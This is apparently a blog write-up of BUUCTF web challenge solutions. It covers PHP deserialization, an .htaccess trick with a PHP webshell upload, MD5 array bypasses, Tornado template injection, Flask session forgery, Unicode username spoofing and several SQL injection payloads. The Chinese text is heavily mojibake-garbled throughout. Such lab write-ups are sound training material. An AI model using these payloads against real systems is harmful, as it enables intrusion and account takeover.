<p>é‡ç‚¹åœ¨class.phpå’Œindex.phpä¸­</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220822144.png" alt="image-20210501220309908"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220857753.png" alt="image-20210501220857753"></p>
<p>æ‰€ä»¥è¦ä¼ å…¥ä¸€ä¸ªselectå‚æ•°ï¼Œåˆ©ç”¨ååºåˆ—åŒ–è®©username=admin</p>
<p>password=100</p>
<p>å› ä¸ºusernameå’Œpasswordä¸¤ä¸ªä¸ºprivateç±»å‹</p>
<p>æ‰€ä»¥æœ‰éšè—çš„ç©ºæ ¼ç¬¦</p>
<p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220212731.png" alt="image-20210501220212731"></p>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>å…ˆä¼ ä¸ª.htaccessæ–‡ä»¶ï¼Œä¸ºäº†è§£æå›¾ç‰‡ç </p>
<pre class="language-none"><code class="language-none">htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚
ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚</code></pre>

<pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php 
&#x2F;&#x2F;è¯¥è¯­å¥ä½œç”¨æ˜¯è®©Apacheå°†å…¶ä»–ç±»å‹æ–‡ä»¶å‡ä»¥phpæ ¼å¼è§£æ</code></pre>

<p>å†ä¼ ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åbpæŠ“åŒ…</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502142204069.png" alt="image-20210502142204069"></p>
<p>åªæœ‰å°†å…¶æ”¹ä¸ºå›¾ç‰‡çš„ç±»å‹æ‰èƒ½æˆåŠŸä¸Šä¼ </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141437234.png" alt="image-20210502141437234"></p>
<p>æ ¹æ®è¿”å›çš„è·¯å¾„ç”¨èœåˆ€è¿æ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141422576.png" alt="image-20210502141422576"></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>è¿›å…¥åä»£ç å®¡è®¡</p>
<p>å…ˆgetè¿›ä¸¤ä¸ªmd5å€¼ç›¸ç­‰çš„å†…å®¹</p>
<p>md5æ— æ³•å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œä½¿å…¶ç›¸ç­‰</p>
<p>å†æ ¹æ®phpçš„ç‰¹æ€§postè¿›passwd=1234567aç»•è¿‡if</p>
<p>è·å¾—flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502172416595.png" alt="image-20210502172416595"></p>
<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>ä»æç¤ºå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªtornadoæ˜¯ä¸€ä¸ªpythonçš„æ¨¡æ¿ï¼Œåœ¨webä½¿ç”¨çš„æ—¶å€™ç»™å‡ºäº†å››ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥è®¿é—®ï¼Œä»æç¤ºä¸­å’Œurlä¸­å¯ä»¥çœ‹å‡ºï¼Œè®¿é—®éœ€è¦æ–‡ä»¶å+æ–‡ä»¶ç­¾åï¼ˆé•¿åº¦ä¸º32ä½ï¼Œè®¡ç®—æ–¹å¼ä¸ºmd5(cookie_secret + md5(filename))ï¼‰;  flagæ–‡ä»¶åé¢˜ç›®å·²ç»™å‡º /fllllllllllag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723131705440.png" alt="image-20210723131705440"></p>
<p>æ‰€ä»¥è¦åšçš„å°±æ˜¯è¦è·å¾—åˆ°cookieå€¼</p>
<p>è¿™é‡Œæ˜¯é‡‡ç”¨æ¨¡æ¿æ³¨å…¥çš„æ–¹å¼ </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723132903953.png" alt="image-20210723132903953"></p>
<p>è¿™é‡Œå¯ä»¥çŒœå‡ºæ¥å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´è€Œä¸”åº”è¯¥å­˜åœ¨è¿‡æ»¤</p>
<p>ç„¶åç™¾åº¦çœ‹ä¸€ä¸‹wp</p>
<pre class="language-none"><code class="language-none">åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œå…·ä½“å®šä¹‰å¯ä»¥[å‚è€ƒTornadoå®˜æ–¹æ–‡æ¡£](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)ï¼</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135655762.png" alt="image-20210723135655762"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723134312675.png" alt="image-20210723134312675"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135914756.png" alt="image-20210723135914756"></p>
<p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¯»å–cookie_secret</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723140608282.png" alt="image-20210723140608282"></p>
<p>ç„¶åå¯¹å…¶è¿›è¡Œmd5åŠ å¯†å°±èƒ½å¾—åˆ°flagäº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135951327.png" alt="image-20210723135951327"></p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/100733581">HCTF2018-admin_è¿·é£å°ç™½-CSDNåšå®¢</a></p>
<p>æ³¨å†Œä¸ªè´¦æˆ·ç™»å½•åå¯ä»¥åœ¨ä¿®æ”¹å¯†ç é¡µé¢çš„æºç æ³¨é‡Šä¸­æ‰¾åˆ°æç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723145616780.png" alt=" "></p>
<p>æŸ¥çœ‹å¯ä»¥æ‰¾åˆ°é¢˜ç›®æºç </p>
<p><strong>ä¸€ã€ sessionä¼ªé€ </strong></p>
<p>flaskä¸­sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨æœ¬åœ°ã€‚flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164939605.png" alt="image-20210723164939605"></p>
<p>æ‰¾åˆ°sessionååˆ©ç”¨pyè„šæœ¬è¿›è¡Œè§£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163354906.png" alt="image-20210723163354906"></p>
<p>ä¾ç…§é¢˜æ„å¯ä»¥çŒœæµ‹åªæœ‰ç”¨adminè´¦æˆ·ç™»å½•æ‰èƒ½å¾—åˆ°flagï¼Œæ‰€ä»¥è¦ä¼ªé€ sessionæ¥ä½¿æˆ‘ä»¬è¢«è®¤ä¸ºæ˜¯adminè´¦æˆ·</p>
<p>é‡æ–°ç¼–ç sessionæ—¶éœ€è¦ç”¨åˆ°secret_keyå¯ä»¥åœ¨config.pyä¸­æ‰¾åˆ°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163710686.png" alt="image-20210723163710686"></p>
<p>ä¼ªé€ session</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163828745.png" alt="image-20210723163828745"></p>
<p>ä¿®æ”¹ååˆ·æ–°é¡µé¢å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164748497.png" alt="image-20210723164748497"></p>
<p><strong>äºŒï¼šUnicodeæ¬ºéª—</strong></p>
<p>ä»£ç å®¡è®¡å¯ä»¥çœ‹å‡ºåœ¨ç™»å½•æ³¨å†Œå’Œä¿®æ”¹å¯†ç æ—¶éƒ½å­˜åœ¨ç”¨æˆ·åçš„å°å†™è½¬æ¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723165801699.png" alt="image-20210723165801699"></p>
<p>çœ‹ä¸€ä¸‹strlower</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723170037720.png" alt="image-20210723170037720"></p>
<p><code>Twisted</code>ç‰ˆæœ¬ä¸º<code>10.2.0</code>ï¼Œè€Œç›®å‰(2020/10/28)<code>Twisted</code>æœ€æ–°ç‰ˆæœ¬å·²æœ‰<code>20.3.0</code>ï¼Œè¿™é‡Œä½¿ç”¨çš„ç‰ˆæœ¬éå¸¸æ—§<br><code>10.2.0</code>ç‰ˆçš„<code>nodeprep.prepare()</code>å¯¹ä¸€äº›ç‰¹æ®Šçš„<code>Unicode</code>ç¼–ç å¤„ç†åä¼šå¾—åˆ°ä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚å¯ä»¥çŸ¥é“å½“ä½¿ç”¨äº†nodeprep.prepare()å‡½æ•°ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬å…ˆä½¿ç”¨unicodeçš„ç¼–ç çš„å­—ç¬¦ï¼Œæ¯”å¦‚è¯´ á´¬ ï¼Œä½¿ç”¨è¯¥å‡½æ•°ä¹‹åï¼Œä»–ä¼šå…ˆå˜æˆå¤§å†™çš„Aï¼Œå†ä½¿ç”¨ä¸€æ¬¡å°±ä¼šå˜æˆå°å†™çš„aã€‚</p>
<p>æ‰€ä»¥å¯ä»¥æ³¨å†Œä¸€ä¸ªá´¬á´°á´¹á´µá´ºç”¨æˆ·å†é€šè¿‡ç™»å½•å’Œä¿®æ”¹å¯†ç ä¸¤æ¬¡ä»¤å…¶å˜ä¸ºadmin</p>
<p><a target="_blank" rel="noopener" href="https://unicode-table.com/en/">Basic Latin â€” âœ”ï¸ â¤ï¸ â˜… Unicode Character Table (unicode-table.com)</a>å¯ä»¥ä»è¿™ä¸ªç½‘ç«™æŸ¥å­—ç¬¦</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172720848.png" alt="image-20210723172720848"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172812674.png" alt="image-20210723172812674"></p>
<p>è¿™é‡Œç™»å½•ä¹‹åè¿›è¡Œä¿®æ”¹å¯†ç ï¼Œåˆ™é€šè¿‡å°å†™è½¬æ¢å°±ä¼šå˜ä¸ºä¿®æ”¹adminè´¦æˆ·çš„å¯†ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723181917454.png" alt="image-20210723181917454"></p>
<p><strong>ä¸‰ã€å¼±å¯†ç </strong></p>
<p>ç”¨æˆ·adminå¯†ç ä¸º123</p>
<p>çˆ†ç ´æˆ–è€…è¯•ä¸€è¯•å°±èƒ½è¯•å‡ºæ¥å¯†ç </p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>è¿›å…¥ååªæœ‰ä¸€ä¸ªæäº¤æ¡†ï¼Œæ²¡å•¥æ€è·¯ï¼Œå…ˆç”¨bpæŠ“ä¸ªåŒ…</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205715453.png" alt="image-20210723205715453"></p>
<p>çœ‹è§æœ‰ä¸ªhint</p>
<p>select * from &#39;admin&#39; where password=md5($pass,true)</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205633361.png" alt="image-20210723205633361"></p>
<p>ç„¶åçŒœè¿™é‡Œåº”è¯¥è¦åˆ©ç”¨sqlæ³¨å…¥çš„ï¼Œä½†æˆ‘ä¸ä¼šäº†x</p>
<p>çœ‹äº†ä¸€ä¸‹è¯´æ˜¯è¦ç”¨ffifdyopæ¥ç»•è¿‡ï¼Œå› ä¸ºè¿™ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯&#39; or &#39;6</p>
<p>å°±ä¼šæ„æˆä¸‡èƒ½å¯†ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210730068.png" alt="image-20210723210730068"></p>
<p>æˆåŠŸè¿›å…¥ä¸‹ä¸€æ­¥ï¼Œå…ˆæŸ¥çœ‹æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210837745.png" alt="image-20210723210837745"></p>
<p>åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„ä¼šè¿”å›nullçš„ç‰¹æ€§å°±èƒ½ç»•è¿‡ï¼Œæ¥ä¸‹æ¥è¿›è¡Œä»£ç å®¡è®¡</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210915141.png" alt="image-20210723210915141"></p>
<p>åŒæ ·å¯ä»¥åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723211130123.png" alt="image-20210723211130123"></p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>sqlæ³¨å…¥ï¼Œå…ˆç”¨fuzzæµ‹ä¸€ä¸‹è¿‡æ»¤ï¼ˆbuuçš„ç½‘ç«™å¥½åƒæœ‰posté™åˆ¶ï¼Œæ‰€ä»¥poståˆ°åé¢ä¹‹åä¼šæ˜¾ç¤ºæäº¤æ¬¡æ•°è¿‡å¤šï¼Œè€Œä¸”ä¸çŸ¥é“æ˜¯ä¸æ˜¯bpçš„é—®é¢˜æœ‰äº›æ²¡æœ‰è¿‡æ»¤çš„ä¹Ÿä¼šè¢«æ˜¾ç¤ºä¸ºè¢«è¿‡æ»¤äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724095707401.png" alt="image-20210724095707401"></p>
<p>è¿™é‡Œåº”è¯¥è¦é‡‡ç”¨boolç›²æ³¨çš„æ–¹å¼ï¼Œä½†æ˜¯è¿‡æ»¤çš„ä¸œè¥¿æœ‰ç‚¹å¤š</p>
<p>å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤äº†æ‰€ä»¥è¦åˆ©ç”¨ï¼ˆï¼‰æ¥ä»£æ›¿ç©ºæ ¼</p>
<p>æŠ„äº†ä¸ªè„šæœ¬</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724131620633.png" alt="image-20210724131620633"></p>
<p>æ„Ÿè§‰æ˜¯å¾ˆç®€å•çš„ç›²æ³¨ï¼Œç„¶åè¦åˆ©ç”¨pythonç¼–è„šæœ¬</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107167452">GXYCTF2019]BabySQliâ€”â€”â€œç»•è¿‡md5æ¯”è¾ƒâ€_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢</a></p>
<p>å½“ç”¨æˆ·åä¸ºadminæ—¶ï¼Œæç¤ºå¯†ç é”™è¯¯ï¼Œå› æ­¤èƒ½çŸ¥é“ç”¨æˆ·åä¸ºadmin</p>
<p>ç™»å½•åè·³è½¬åˆ°search.phpä¸­ï¼Œåœ¨æºç é‡Œå­˜åœ¨ä¸€ä¸ªè¿›è¡ŒbaseåŠ å¯†çš„æç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724153525231.png" alt="image-20210724153525231"></p>
<p>sqlæ³¨å…¥ï¼Œå…ˆfuzzçœ‹ä¸€ä¸‹è¿‡æ»¤</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724152502898.png" alt="image-20210724152502898"></p>
<p>ç„¶åå¯ä»¥åˆ©ç”¨å¤§å†™ç»•è¿‡æŸ¥åˆ°å…±æœ‰3åˆ—ï¼ˆå…¶å®ç›´æ¥unionè¯•ä¹Ÿå¯ä»¥</p>
<p>ä¹‹åè¦åˆ©ç”¨è”åˆæ³¨å…¥</p>
<p><strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚</strong></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724152803276.png" alt="image-20210724152803276"></p>
<p>åç«¯ä»£ç </p>
<pre class="language-none"><code class="language-none">&lt;?php$row;
$pass&#x3D;$_POST[&#39;pw&#39;];
if($row[&#39;username&#39;]&#x3D;&#x3D;â€™adminâ€™)&#123;
if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; 
echo $flag; 
&#125;else&#123; echo â€œwrong pass!â€; 
&#125;&#125;
else&#123; echo â€œwrong user!â€;&#125;</code></pre>

<p>æ‰€ä»¥å¯ä»¥åœ¨è”åˆæŸ¥è¯¢æ—¶æ„é€ è™šæ‹Ÿçš„æ•°æ®åˆ©ç”¨è¿™ä¸ªæ•°æ®è¿›è¡Œç™»å½•æ“ä½œ</p>
<pre class="language-none"><code class="language-none">username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #
password&#x3D;123</code></pre>

<p>å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724153406008.png" alt="image-20210724153406008"></p>
<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>å…ˆjoinä¸€ä¸‹ï¼Œç„¶åæºç é‡Œæœ‰</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724215234506.png" alt="image-20210724215234506"></p>
<p>è¿™é‡Œè¿‡æ»¤äº†union select ä¸­é—´å¯ä»¥åŠ ä¸ªæ³¨é‡Šç¬¦æ¥å½“ç©ºæ ¼æ¥ç»•è¿‡å»</p>
<p>è¿™ä¸ªé¡µé¢å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæœ€ç»ˆå¯ä»¥æŸ¥åˆ°è¿™äº›</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724221156289.png" alt="image-20210724221156289"></p>
<p>è¿™é‡Œèƒ½çœ‹å‡ºæ¥dataæ˜¯ä¸ªåºåˆ—åŒ–åçš„ç»“æœï¼Œä½†æ˜¯ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p>
<p>ç„¶åæ‰«ä¸€ä¸‹å‘ç°</p>
<p>æœ‰robots.txtå¤‡ä»½æ–‡ä»¶</p>
<pre class="language-none"><code class="language-none">&lt;?php


class UserInfo
&#123;
    public $name &#x3D; &quot;&quot;;
    public $age &#x3D; 0;
    public $blog &#x3D; &quot;&quot;;

    public function __construct($name, $age, $blog)
    &#123;
        $this-&gt;name &#x3D; $name;
        $this-&gt;age &#x3D; (int)$age;
        $this-&gt;blog &#x3D; $blog;
    &#125;

    function get($url)
    &#123;
        $ch &#x3D; curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output &#x3D; curl_exec($ch);
        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode &#x3D;&#x3D; 404) &#123;
            return 404;
        &#125;
        curl_close($ch);

        return $output;
    &#125;

    public function getBlogContents ()
    &#123;
        return $this-&gt;get($this-&gt;blog);
    &#125;

    public function isValidBlog ()
    &#123;
        $blog &#x3D; $this-&gt;blog;
        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);
    &#125;

&#125;</code></pre>

<p>å¥½ï¼Œçœ‹ä¸æ‡‚äº†ï¼ˆ</p>
<p>æŠ„ä¸€ä¸‹åˆ«äººçš„åˆ†æ</p>
<pre class="language-none"><code class="language-none">&lt;?php
 
 
class UserInfo
&#123;
    public $name &#x3D; &quot;&quot;;
    public $age &#x3D; 0;
    public $blog &#x3D; &quot;&quot;;
 
    public function __construct($name, $age, $blog)
    &#123;
        $this-&gt;name &#x3D; $name;
        $this-&gt;age &#x3D; (int)$age;
        $this-&gt;blog &#x3D; $blog;
    &#125;
 
    function get($url)
    &#123;
        $ch &#x3D; curl_init();
        &#x2F;*curl_init()ï¼šåˆå§‹åŒ–ä¸€ä¸ª cURL ä¼šè¯å¹¶ä¸”å…¨éƒ¨çš„é€‰é¡¹éƒ½è¢«è®¾ç½®åè¢«è°ƒç”¨*&#x2F;
 
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        &#x2F;*
            curl_setopt â€” ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹ã€‚
                è¯´æ˜ï¼š
                    bool curl_setopt ( resource $ch , int $option , mixed $value )
                å‚æ•°:
                    chï¼šç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚
                    optionï¼šéœ€è¦è®¾ç½®çš„CURLOPT_XXXé€‰é¡¹ã€‚
                    valueï¼šå°†è®¾ç½®åœ¨optioné€‰é¡¹ä¸Šçš„å€¼ã€‚
                    å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªboolç±»å‹çš„å€¼ï¼š
                        CURLOPT_RETURNTRANSFERï¼šå°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚
                    å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªstringç±»å‹çš„å€¼ï¼š
                        CURLOPT_URLï¼šéœ€è¦è·å–çš„URLåœ°å€ï¼Œä¹Ÿå¯ä»¥åœ¨curl_init()å‡½æ•°ä¸­è®¾ç½®ã€‚
                         
                         
                        ###################
                        æ–‡ä»¶æµçš„å½¢å¼:æŒ‡çš„æ˜¯åœ¨ä¼ é€’è¿‡ç¨‹ä¸­çš„æ–‡ä»¶,æ¯”å¦‚ä½ ä¸Šä¼ ä¸€å¼ å›¾ç‰‡,é‚£ä¹ˆä»–ä¸æ˜¯ä»¥ä¸€ä¸ªå®Œæ•´çš„å›¾ç‰‡ä¼ è¾“çš„,æ˜¯å°†æ–‡ä»¶æŒ‰ç‰¹å®šç¼–ç çš„å­—ç¬¦ä¼ è¾“.è¿™ä¸ªå°±æ˜¯æ–‡ä»¶æµ
        *&#x2F;
        $output &#x3D; curl_exec($ch);
        &#x2F;*curl_exec ï¼šæ‰§è¡Œ cURL ä¼šè¯*&#x2F;
        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);
        &#x2F;*
            curl_getinfo â€” è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯
                è¯´æ˜ï¼š
                       mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )è·å–æœ€åä¸€æ¬¡ä¼ è¾“çš„ç›¸å…³ä¿¡æ¯ã€‚
                å‚æ•°ï¼š
                      ch ç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚
                      optï¼šè¿™ä¸ªå‚æ•°å¯èƒ½æ˜¯ä»¥ä¸‹å¸¸é‡ä¹‹ä¸€:
                            CURLINFO_HTTP_CODE : æœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç 
        *&#x2F;
         
        if($httpCode &#x3D;&#x3D; 404) &#123;
            return 404;
        &#125;
        curl_close($ch);
 
        return $output;
    &#125;
 
    public function getBlogContents ()
    &#123;
        return $this-&gt;get($this-&gt;blog);
    &#125;
 
    public function isValidBlog ()
    &#123;
        $blog &#x3D; $this-&gt;blog;
        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);
    &#125;
    
